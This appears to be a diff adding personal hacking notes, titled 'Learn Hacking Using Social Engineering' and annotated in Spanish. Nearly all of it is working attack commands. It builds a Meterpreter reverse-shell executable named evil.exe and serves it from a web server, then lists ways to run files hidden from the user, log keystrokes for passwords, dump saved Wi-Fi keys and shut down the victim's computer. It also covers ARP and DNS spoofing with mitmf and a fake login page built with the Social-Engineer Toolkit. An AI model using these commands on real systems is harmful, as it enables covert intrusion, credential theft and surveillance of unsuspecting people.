@@ -1,0 +1,104 @@
+Learn Hacking Using Social Engineering
+
+
+msfconsole
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.251 LPORT=4444 --format=exe > evil.exe
+
+cp evil.exe /var/www/html
+
+service apache2 start
+
+use exploit/multi/handler
+
+	set payload windows/meterpreter/reverse_tcp
+
+	set LHOST 192.168.0.251
+
+	set LPORT 4444
+
+	run
+
+
+cp ccsetup.bat /var/www/html
+
+
+--Comandos para msfconsole cuando este conectado a otra maquina
+
+upload [Location]/[Name of file]
+--Para cargar un archivo nuevo a la maquina externa/objetivo.
+
+execute -f [Name of file]
+--Para ejecutar el archivo sin necesidad que lo haga el usuario de la otra computadora
+execute -f [Name of file] -H
+--Va a ejecutar ele archivo ocultamente, asi no se entera el usuario.
+
+keyscan_start
+--Te permite ver todo lo que coloque el usuario, ya sea como contraseña, mail, etc
+
+shell
+--Ejecuta los comandos de Windows = C:\Users|...
+
+start [firefox] [Name of webpage]
+--Abre la pagina.
+
+shutdown -s -t 100 --> [Time]
+--Apaga la computadora del usuario en el tiempo indicado
+
+
+background
+use windows/manage/payload_inject
+set payload windows/meterpreter/reverse_tcp
+	set LHOST 192.168.0.251
+	set session 1
+	set handler true
+	run
+--Te permite ver todo lo que la victima tenga en la computadora (visualmente)
+
+shell
+netsh wlan show profile
+--Lista todos los profile de la maquina
+netsh wlan show profile [profile name] key=clear
+
+netsh wlan show interface
+
+netstat
+--lista todas las conecciones de la maquina
+
+getmac & ipconfig
+
+
+
+root@kali:
+mitmf --arp --spoof --gateway 192.168.0.1 --target [Victim ip adress] -i eth0
+route -n
+--Para obtener gateway adress
+
+nano /etc/mitmf/mitmf.conf
+cd /var/www/html
+nano index.html
+mitmf --arp --spoof --gateway 192.168.0.1 --target [Victim ip adress] -i eth0 --dns
+
+--Fake login page:
+setoolkit
+option 1
+option 2
+option 3
+option 2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
